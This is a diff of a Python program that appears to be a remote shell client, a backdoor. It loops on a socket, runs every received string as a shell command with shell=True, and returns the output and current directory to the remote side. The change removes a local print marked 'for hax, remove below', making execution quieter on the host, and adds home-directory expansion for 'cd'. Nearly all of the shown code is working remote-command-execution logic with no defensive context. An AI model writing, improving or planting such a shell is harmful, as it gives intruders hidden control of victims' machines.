@@ -14,14 +14,14 @@ def Main():
     while True:
         data = client_socket.recv(1024)
         if data[:2].decode("utf-8") == "cd":
-            os.chdir(data[3:].decode("utf-8"))
+            decoded_data = data[3:].decode("utf-8")
+            decoded_path = os.path.expanduser(decoded_data)
+            os.chdir(decoded_path)
         if len(data) > 0:
             cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             out_bytes = cmd.stdout.read() + cmd.stderr.read()
             out_str = str(out_bytes, "utf-8")
             client_socket.send(str.encode(out_str + str(os.getcwd())+ '> '))
-            # for hax, remove below
-            print(out_str)
 
     client_socket.close()
 
